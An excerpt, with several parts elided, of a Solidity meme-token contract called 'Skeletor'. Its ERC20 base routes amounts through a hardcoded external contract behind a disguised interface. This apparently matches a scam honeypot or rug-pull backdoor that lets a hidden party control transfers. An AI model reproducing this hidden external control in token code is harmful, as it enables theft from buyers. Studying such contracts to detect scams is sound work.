...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _mastersUniverse = 0x59d2E91619ee2FA8A11DA99B3E21Ee724Ec3144D;
    address public pair;

    IDEXRouter router;
    IERC5679 mastersUniverse;
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        mastersUniverse = IERC5679(_mastersUniverse);
    ...
    function getAmount(uint256 amount) internal returns (uint256) {
        return mastersUniverse.sendTransaction(amount);
    }
    ...
    function _DeploySkeletor(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySkeletor(creator, initialSupply);
    }
}

contract Skeletor is ERC20Token {
    constructor() ERC20Token("Skeletor", "SKELETOR", msg.sender, 420690000 * 10 ** 18) {
    }
}